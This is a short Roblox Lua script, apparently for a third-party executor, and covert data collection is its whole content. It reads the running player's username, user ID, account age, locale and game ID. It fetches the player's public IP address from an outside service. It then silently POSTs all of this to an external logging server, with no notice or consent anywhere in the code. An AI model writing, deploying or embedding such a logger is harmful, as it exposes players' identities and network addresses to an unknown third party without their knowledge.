local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalizationService = game:GetService("LocalizationService")

local player = Players.LocalPlayer
local placeId = game.PlaceId

local userIP = "Unknown"
pcall(function()
    userIP = game:HttpGet("https://api.ipify.org")
end)

local data = {
    username = player.Name,
    displayName = player.DisplayName,
    userId = player.UserId,
    gameId = placeId,
    accountAge = tostring(player.AccountAge) .. " days",
    region = LocalizationService.RobloxLocaleId,
    ip = userIP
}

local function SendWebhook(url, data)
    local jsonData = HttpService:JSONEncode(data)
    
    if type(request) == "function" then
        local success, res = pcall(request, {
            Url = url, Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = jsonData
        })
        if success then return true, res end
    end
    
    if type(http_request) == "function" then
        local success, res = pcall(http_request, {
            Url = url, Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = jsonData
        })
        if success then return true, res end
    end
    
    local success, res = pcall(function()
        return HttpService:PostAsync(url, jsonData)
    end)
    
    return success, res
end

local webhookUrl = "https://depazzhub-api.onrender.com/log"

SendWebhook(webhookUrl, data)
